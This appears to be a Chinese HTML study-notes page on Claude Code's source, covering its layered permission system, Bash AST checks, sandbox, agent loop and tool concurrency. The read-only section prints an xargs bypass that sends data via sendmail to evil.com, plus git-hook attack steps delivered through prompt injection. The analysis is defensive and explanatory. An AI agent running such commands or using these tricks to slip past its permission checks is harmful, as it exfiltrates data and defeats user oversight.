@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>苏格拉底 01 · 安全体系与 Agent 循环 — Claude Code 源码学习笔记</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--green:#00e676;--green-dim:#00b050;--green-bright:#69ff9c;--bg:#0a0d0a;--bg2:#0d110d;--border:#1a2e1a}
+
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg);color:var(--green);font-family:'JetBrains Mono','Courier New',monospace;font-size:13px;line-height:1.6;display:flex;flex-direction:column}
+
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.08) 2px,rgba(0,0,0,.08) 4px);pointer-events:none;z-index:9999}
+
+@keyframes flicker{0%,100%{opacity:1}92%{opacity:1}93%{opacity:.97}94%{opacity:1}96%{opacity:.98}97%{opacity:1}}
+body{animation:flicker 8s infinite}
+
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.cursor{display:inline-block;width:8px;height:14px;background:var(--green);vertical-align:middle;animation:blink 1s step-end infinite;margin-left:2px}
+
+.glow{text-shadow:0 0 8px var(--green),0 0 20px rgba(0,230,118,.4)}
+
+/* header */
+.ascii-header{padding:18px 28px 12px;border-bottom:1px dashed var(--border);flex-shrink:0}
+.ascii-title{font-size:10.5px;line-height:1.2;white-space:pre;color:var(--green);text-shadow:0 0 10px rgba(0,230,118,.5);overflow:hidden}
+.header-meta{color:var(--green-dim);font-size:11px;display:flex;justify-content:space-between;align-items:center;margin-top:8px;white-space:nowrap;gap:16px}
+
+/* layout */
+.layout{flex:1;display:flex;overflow:hidden}
+
+/* sidebar */
+.sidebar{width:260px;flex-shrink:0;display:flex;flex-direction:column;border-right:1px dashed var(--border);overflow:hidden}
+.sidebar-scroll{flex:1;overflow-y:auto;padding:16px 0 8px}
+.sidebar-scroll::-webkit-scrollbar{width:4px}
+.sidebar-scroll::-webkit-scrollbar-thumb{background:var(--border)}
+.prompt{color:var(--green-dim);padding:0 16px 10px;font-size:11.5px;white-space:nowrap;overflow:hidden}
+.prompt b{color:var(--green-bright)}
+.ls-table{width:100%;border-collapse:collapse;table-layout:fixed}
+.ls-table th{padding:3px 16px;text-align:left;color:var(--green-dim);font-size:10px;letter-spacing:2px;border-bottom:1px solid var(--border);font-weight:700;white-space:nowrap}
+.ls-table th:first-child{width:88px}
+.ls-table td{padding:4px 16px;font-size:11.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.ls-table tr.dir td{color:var(--green-bright);font-weight:700}
+.ls-table tr.file td{color:var(--green-dim)}
+.ls-table tr.file a{color:inherit;text-decoration:none}
+.ls-table tr.active td{background:var(--green);color:#000;font-weight:700}
+.ls-table tr.active a{color:#000;text-decoration:none}
+.ls-table tr:hover:not(.active) td{background:rgba(0,230,118,.07);color:var(--green);cursor:pointer}
+.ls-table tr:hover:not(.active) a{color:var(--green)}
+.phase-label{font-size:11px}
+.phase-a{color:#69ff9c}.phase-b{color:#40c8ff}.phase-c{color:#ffd740}.phase-p{color:#ff80ab}.phase-s{color:#ff9100}
+.sidebar-footer{padding:10px 16px;color:var(--green-dim);font-size:11px;border-top:1px dashed var(--border);flex-shrink:0}
+
+/* main */
+.main{flex:1;overflow-y:auto;padding:24px 40px 40px}
+.main::-webkit-scrollbar{width:4px}
+.main::-webkit-scrollbar-thumb{background:var(--border)}
+.page-prompt{color:var(--green-dim);margin-bottom:18px;font-size:12px}
+.page-prompt b{color:var(--green-bright)}
+
+/* markdown content */
+.content h1{font-size:20px;font-weight:700;color:var(--green-bright);margin-bottom:16px;text-shadow:0 0 12px rgba(105,255,156,.4)}
+.content h1::before{content:'# ';color:var(--green-dim)}
+.content h2{font-size:15px;font-weight:700;color:var(--green);margin:28px 0 10px}
+.content h2::before{content:'## ';color:var(--green-dim)}
+.content h3{font-size:13px;font-weight:700;color:var(--green-dim);margin:20px 0 8px}
+.content h3::before{content:'### ';color:var(--border)}
+.content p{color:var(--green-dim);line-height:1.85;margin-bottom:16px;font-size:13px}
+.content a{color:var(--green);text-decoration:none;border-bottom:1px dashed var(--green-dim)}
+.content a:hover{color:var(--green-bright)}
+.content strong{color:var(--green)}
+.content em{color:var(--green-dim)}
+.content code{color:var(--green-bright);font-size:12px}
+.content ul,.content ol{color:var(--green-dim);padding-left:20px;margin-bottom:16px;font-size:13px}
+.content li{margin-bottom:4px;line-height:1.7}
+.content hr{border:none;border-top:1px dashed var(--border);margin:20px 0}
+.content blockquote{border-left:3px solid var(--green-dim);padding-left:14px;color:var(--green-dim);margin:16px 0;font-style:italic}
+
+/* code blocks */
+.code-block{background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--green-dim);border-radius:4px;padding:16px 20px;margin:16px 0 24px;overflow-x:auto}
+.code-block pre{font-size:12px;line-height:1.75;color:var(--green-dim);white-space:pre}
+
+/* tables */
+.table-wrap{overflow-x:auto;margin:16px 0}
+.table-wrap table{border-collapse:collapse;font-size:12px;width:100%}
+.table-wrap th{padding:6px 14px;color:var(--green);border-bottom:1px solid var(--green-dim);text-align:left;letter-spacing:1px;font-size:10px;text-transform:uppercase}
+.table-wrap td{padding:6px 14px;color:var(--green-dim);border-bottom:1px dashed var(--border)}
+.table-wrap tr:hover td{background:rgba(0,230,118,.04)}
+
+/* checklist */
+.checklist{list-style:none;padding-left:4px;margin-bottom:16px;font-size:13px}
+.checklist li{margin-bottom:4px;line-height:1.7;color:var(--green-dim)}
+.checklist li::before{content:'[x] ';color:var(--green)}
+.checklist li.unchecked::before{content:'[ ] ';color:var(--green-dim)}
+
+/* status bar */
+.statusbar{border-top:1px dashed var(--border);padding:5px 28px;display:flex;justify-content:space-between;font-size:11px;color:var(--green-dim);background:var(--bg2);flex-shrink:0;white-space:nowrap}
+.statusbar b{color:var(--green)}
+
+@keyframes typing{from{width:0}to{width:100%}}
+.typed{overflow:hidden;white-space:nowrap;display:inline-block;animation:typing 1.2s steps(40) .3s both}
+
+/* matrix rain canvas */
+#matrix-canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;opacity:.045}
+.ascii-header,.layout,.statusbar{position:relative;z-index:1}
+
+/* mobile menu toggle */
+.menu-toggle{display:none;background:none;border:1px solid var(--green-dim);color:var(--green);font-family:inherit;font-size:11px;padding:3px 10px;cursor:pointer;letter-spacing:1px}
+.menu-toggle:hover{border-color:var(--green);color:var(--green-bright)}
+
+/* mobile */
+@media(max-width:700px){
+  html,body{overflow:auto}
+  .ascii-title{font-size:6px}
+  .header-meta{font-size:10px}
+  .menu-toggle{display:inline-block}
+  .layout{flex-direction:column}
+  .sidebar{width:100%;border-right:none;border-bottom:1px dashed var(--border);display:none;max-height:60vh}
+  .sidebar.open{display:flex}
+  .main{padding:16px 20px 40px}
+  .content h1{font-size:16px}
+  .page-prompt{font-size:11px}
+  .statusbar{font-size:10px;padding:5px 16px}
+}
+</style>
+</head>
+<body>
+<canvas id="matrix-canvas"></canvas>
+<script>
+(function(){
+  const c=document.getElementById('matrix-canvas')
+  const ctx=c.getContext('2d')
+  const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン01'
+  let cols,drops
+  function resize(){
+    c.width=window.innerWidth;c.height=window.innerHeight
+    cols=Math.floor(c.width/18);drops=Array(cols).fill(1)
+  }
+  resize();window.addEventListener('resize',resize)
+  setInterval(function(){
+    ctx.fillStyle='rgba(10,13,10,0.05)'
+    ctx.fillRect(0,0,c.width,c.height)
+    ctx.fillStyle='#00e676';ctx.font='14px monospace'
+    drops.forEach(function(y,i){
+      ctx.fillText(chars[Math.random()*chars.length|0],i*18,y*18)
+      if(y*18>c.height&&Math.random()>0.975)drops[i]=0
+      drops[i]++
+    })
+  },60)
+})()
+</script>
+
+<header class="ascii-header">
+<pre class="ascii-title glow">  ██████╗██╗      █████╗ ██╗   ██╗██████╗ ███████╗     ██████╗ ██████╗ ██████╗ ███████╗
+ ██╔════╝██║     ██╔══██╗██║   ██║██╔══██╗██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝
+ ██║     ██║     ███████║██║   ██║██║  ██║█████╗      ██║     ██║   ██║██║  ██║█████╗
+ ██║     ██║     ██╔══██║██║   ██║██║  ██║██╔══╝      ██║     ██║   ██║██║  ██║██╔══╝
+ ╚██████╗███████╗██║  ██║╚██████╔╝██████╔╝███████╗    ╚██████╗╚██████╔╝██████╔╝███████╗
+  ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝</pre>
+<div class="header-meta">
+  <span class="typed">Last updated: 2026-04-01 &nbsp;|&nbsp; claude-code main branch</span>
+  <span style="display:flex;align-items:center;gap:12px">
+    <button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('open')">[MENU]</button>
+    <span>[STUDY NOTES v1.0]</span>
+  </span>
+</div>
+</header>
+
+<div class="layout">
+  <nav class="sidebar">
+    <div class="sidebar-scroll">
+
+    <div class="prompt"><b>guest@claude-study</b>:~/notes$ ls<span class="cursor"></span></div>
+    <table class="ls-table">
+      <thead><tr><th>PERMS</th><th>NAME</th></tr></thead>
+      <tbody><tr class="dir"><td></td><td class="phase-label phase-a">Phase A/</td></tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-01-startup.html">Task 1 · 启动流程</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-02-data-structures.html">Task 2 · 数据结构</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-03-system-overview.html">Task 3 · 子系统</a></td>
+      </tr><tr class="dir"><td></td><td class="phase-label phase-b">Phase B/</td></tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-04-agent-loop.html">Task 4 · Agent 循环</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-05-tool-system.html">Task 5 · 工具系统</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-06-multi-agent.html">Task 6 · 多智能体</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-07-security.html">Task 7 · 安全沙箱</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-08-plugins-skills.html">Task 8 · 插件技能</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-09-memory.html">Task 9 · 上下文管理</a></td>
+      </tr><tr class="dir"><td></td><td class="phase-label phase-c">Phase C/</td></tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-10-cross-cutting.html">Task 10 · 横切关注点</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="task-12-reflection.html">Task 12 · 复盘总结</a></td>
+      </tr><tr class="dir"><td></td><td class="phase-label phase-p">模式卡片/</td></tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="patterns.html">模式卡片总览</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-01.html">01 · 流式工具循环</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-02.html">02 · Tool 接口抽象</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-03.html">03 · 进度上报解耦</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-04.html">04 · 分层 Agent 编排</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-05.html">05 · Coordinator 模式</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-06.html">06 · 多层防御安全</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-07.html">07 · 声明式权限</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-08.html">08 · 插件热加载</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-09.html">09 · 分层记忆</a></td>
+      </tr><tr class="file">
+        <td>-rw-r--r--</td>
+        <td><a href="pattern-10.html">10 · 上下文压缩</a></td>
+      </tr><tr class="dir"><td></td><td class="phase-label phase-s">苏格拉底专题/</td></tr><tr class="active">
+        <td>-rw-r--r--</td>
+        <td><a href="socratic-01-security-and-agent-loop.html">01 · 安全与 Agent 循环</a></td>
+      </tr></tbody>
+    </table>
+
+    </div>
+    <div class="sidebar-footer">23 files found.</div>
+  </nav>
+
+  <main class="main">
+    <div class="page-prompt">
+      <b>guest@claude-study</b>:~/notes/socratic$ <span style="color:var(--green)">cat socratic-01.md</span>
+    </div>
+    <div class="content">
+      <h1>苏格拉底专题 01：安全体系与 Agent 循环</h1>
+
+<h2>第一部分：权限系统——五层防御模型</h2>
+
+<h3>核心设计问题：谁来决定一个工具调用是否安全？</h3>
+
+<p>模型既是工具的调用者，也是任务的执行者。让模型自己判断操作安不安全不可靠（幻觉问题），因此安全判断必须由<strong>系统规则 + 用户确认</strong>共同完成。</p>
+
+<h3>五层防御总览</h3>
+
+<div class="table-wrap"><table><thead><tr>
+<th>层</th>
+<th>机制</th>
+<th>思路</th>
+</tr></thead><tbody>
+<tr><td>1</td><td>工具静态分类</td><td>只读工具直接放行</td></tr>
+<tr><td>2</td><td>Bash AST 分析</td><td>解析命令结构，fail-closed 白名单</td></tr>
+<tr><td>3</td><td>权限规则匹配</td><td>exact / prefix / wildcard 三级粒度</td></tr>
+<tr><td>4</td><td>用户交互确认</td><td>以上都无法判断时才问用户</td></tr>
+<tr><td>5</td><td>OS 沙箱</td><td>最后一道兜底（opt-in）</td></tr>
+</tbody></table></div>
+
+<h3>第二层：Bash AST 分析</h3>
+
+<p>核心文件：<code>src/utils/bash/ast.ts</code></p>
+
+<p>把 bash 命令解析成 AST，在语法树层面判断危险性。关键设计——<strong>fail-closed（失败即关闭）</strong>：</p>
+
+<ul>
+<li>白名单里的节点 → 逐个分析，放行已知安全的</li>
+<li><code>DANGEROUS_TYPES</code> 里的 → 直接标记危险</li>
+<li>两者都不在的未知节点 → 也当作危险处理</li>
+</ul>
+
+<div class="code-block"><pre>const DANGEROUS_TYPES = new Set([
+  'command_substitution', 'process_substitution',
+  'subshell', 'for_statement', 'while_statement',
+  'if_statement', 'case_statement', 'function_definition',
+  'test_command', 'ansi_c_string', ...
+])</pre></div>
+
+<p><strong>为什么比黑名单好？</strong> 黑名单漏掉一个危险命令就完了；白名单漏掉的东西默认被拦截。</p>
+
+<h3>第三层：权限规则三级粒度</h3>
+
+<p>核心文件：<code>src/utils/permissions/shellRuleMatching.ts</code></p>
+
+<div class="code-block"><pre>type ShellPermissionRule =
+  | { type: 'exact',    command: string }   // "npm test"
+  | { type: 'prefix',   prefix: string }    // "npm:*"
+  | { type: 'wildcard', pattern: string }   // "git commit -m *"</pre></div>
+
+<p>前缀匹配是「最小授权」和「实用性」之间的平衡点。</p>
+
+<h3>第五层：OS 沙箱</h3>
+
+<p>核心文件：<code>src/utils/sandbox/sandbox-adapter.ts</code></p>
+
+<div class="table-wrap"><table><thead><tr>
+<th>平台</th>
+<th>机制</th>
+</tr></thead><tbody>
+<tr><td>macOS</td><td>seatbelt（sandbox-exec）</td></tr>
+<tr><td>Linux</td><td>seccomp + bubblewrap</td></tr>
+</tbody></table></div>
+
+<p><strong>关键发现：沙箱默认关闭</strong>（<code>settings?.sandbox?.enabled ?? false</code>）。原因是可用性——沙箱会导致 <code>npm install</code> 等常见操作直接失败。</p>
+
+<p>配置后 <code>autoAllowBashIfSandboxed</code> 可自动放行 bash——沙箱接管安全职责后，权限确认就可以放松。</p>
+
+<hr>
+
+<h2>第二部分：只读判断深潜</h2>
+
+<h3>flag 级白名单</h3>
+
+<p>核心文件：<code>src/tools/BashTool/readOnlyValidation.ts</code></p>
+
+<div class="code-block"><pre>const COMMAND_ALLOWLIST = {
+  xargs: {
+    safeFlags: {
+      '-I': '{}',
+      '-n': 'number',
+      '-0': 'none',
+      // -i 和 -e 被移除！
+    }
+  },
+  sed: { safeFlags: { '--quiet': 'none', ... } },
+  ...GIT_READ_ONLY_COMMANDS,
+}</pre></div>
+
+<h3>xargs -i 漏洞案例</h3>
+
+<div class="code-block"><pre>echo /usr/sbin/sendm | xargs -it tail a@evil.com
+# 验证器以为：-i 和 t 是两个 flag
+# GNU xargs 实际：-i 的 replace-str=t，tail 成为目标命令
+# → /usr/sbin/sendmail → 网络数据泄露</pre></div>
+
+<h3>git hooks 攻击向量</h3>
+
+<p><code>git status</code> 是只读命令，但 git 执行前会跑 hooks——hooks 可执行任意代码。</p>
+
+<p>三种攻击场景：</p>
+<ol>
+<li><code>cd /malicious/dir &amp;&amp; git status</code> — 触发恶意 hooks</li>
+<li>裸仓库伪造 — 删 <code>.git/HEAD</code>，当前目录放 <code>hooks/pre-commit</code></li>
+<li>先写后执行 — <code>mkdir -p hooks &amp;&amp; echo 'malicious' &gt; hooks/pre-commit &amp;&amp; git status</code></li>
+</ol>
+
+<p>攻击者不需要是内鬼——通过 <strong>prompt injection</strong>，在代码、PR、issue 中嵌入指令即可。</p>
+
+<h3>完整只读判断链</h3>
+
+<div class="code-block"><pre>命令能解析吗？
+  → 有未展开的变量/通配符吗？
+    → 命令名在白名单里吗？
+      → 每个 flag 都在 safeFlags 里吗？
+        → flag 的参数类型匹配吗？
+          → 全部通过 → readOnly = true
+任何一步失败 → false（fail-closed）</pre></div>
+
+<hr>
+
+<h2>第三部分：Agent 循环——状态机</h2>
+
+<h3>基本结构</h3>
+
+<p>核心文件：<code>src/query.ts</code></p>
+
+<p><code>query()</code> 是 <code>AsyncGenerator</code>（<code>async function*</code>），用 <code>while(true)</code> 驱动。AsyncGenerator 让每个事件实时 yield 给调用方，实现流式渲染。</p>
+
+<h3>状态定义</h3>
+
+<div class="code-block"><pre>type State = {
+  messages: Message[]
+  turnCount: number
+  transition: Continue | undefined
+  hasAttemptedReactiveCompact: boolean
+  maxOutputTokensRecoveryCount: number
+  // ...
+}</pre></div>
+
+<h3>退出原因三类</h3>
+
+<div class="table-wrap"><table><thead><tr>
+<th>类别</th>
+<th>reason</th>
+<th>说明</th>
+</tr></thead><tbody>
+<tr><td>正常结束</td><td>completed</td><td>模型说完了</td></tr>
+<tr><td></td><td>aborted_streaming</td><td>用户中断（streaming）</td></tr>
+<tr><td></td><td>aborted_tools</td><td>用户中断（工具执行）</td></tr>
+<tr><td></td><td>hook_stopped</td><td>Hook 阻止</td></tr>
+<tr><td>异常退出</td><td>prompt_too_long</td><td>上下文超长</td></tr>
+<tr><td></td><td>model_error</td><td>API 报错</td></tr>
+<tr><td></td><td>blocking_limit</td><td>速率限制</td></tr>
+<tr><td>自救转换</td><td>reactive_compact_retry</td><td>压缩后重试</td></tr>
+<tr><td></td><td>max_output_tokens_escalate</td><td>调高 token 上限</td></tr>
+<tr><td></td><td>next_turn</td><td>正常下一轮</td></tr>
+</tbody></table></div>
+
+<p>自救用 <code>transition</code>（不退出循环），异常用 <code>return</code>（退出循环）。</p>
+
+<hr>
+
+<h2>第四部分：工具并发控制</h2>
+
+<h3>isConcurrencySafe</h3>
+
+<p>核心文件：<code>src/services/tools/StreamingToolExecutor.ts</code></p>
+
+<div class="code-block"><pre>canExecuteTool(isConcurrencySafe: boolean): boolean {
+  const executingTools = this.tools.filter(t =&gt; t.status === 'executing')
+  return (
+    executingTools.length === 0 ||
+    (isConcurrencySafe &amp;&amp; executingTools.every(t =&gt; t.isConcurrencySafe))
+  )
+}</pre></div>
+
+<h3>BashTool 的动态判断</h3>
+
+<div class="code-block"><pre>isConcurrencySafe(input) {
+  return this.isReadOnly?.(input) ?? false;
+}</pre></div>
+
+<p><code>bash("ls")</code> → 只读 → 可并发；<code>bash("npm install")</code> → 非只读 → 独占。</p>
+
+<p>工具自声明比全局「读/写」分类更精确——两个写不同文件的操作可以安全并行，两个 <code>npm install</code> 却会冲突。</p>
+
+<hr>
+
+<h2>关键设计原则</h2>
+
+<div class="table-wrap"><table><thead><tr>
+<th>原则</th>
+<th>体现</th>
+</tr></thead><tbody>
+<tr><td>Fail-closed</td><td>AST 白名单、只读判断链</td></tr>
+<tr><td>分层防御</td><td>五层各有不同安全/体验平衡点</td></tr>
+<tr><td>安全 vs 体验</td><td>沙箱 opt-in、autoAllowBashIfSandboxed</td></tr>
+<tr><td>自声明优于全局规则</td><td>isConcurrencySafe 由工具自己决定</td></tr>
+<tr><td>状态机驱动</td><td>Agent 循环的 transition</td></tr>
+<tr><td>流式优先</td><td>AsyncGenerator 实时输出</td></tr>
+</tbody></table></div>
+
+<hr>
+
+<h2>学习进度</h2>
+
+<ul class="checklist">
+<li>权限系统五层防御模型</li>
+<li>Bash AST 安全分析与 fail-closed 策略</li>
+<li>权限规则三级粒度</li>
+<li>OS 沙箱机制与配置</li>
+<li>只读判断深潜（flag 级白名单、git hooks 攻击）</li>
+<li>Agent 循环状态机</li>
+<li>工具并发控制</li>
+<li class="unchecked">多智能体架构</li>
+<li class="unchecked">上下文管理与压缩</li>
+<li class="unchecked">插件/技能系统</li>
+</ul>
+
+    </div>
+  </main>
+</div>
+
+<footer class="statusbar">
+  <span>[MODE: NORMAL] &nbsp; [ENCODING: UTF-8] &nbsp; [BRANCH: main]</span>
+  <span>&copy; 2026 &nbsp;<b>claude-code-study</b></span>
+</footer>
+
+</body>
+</html>
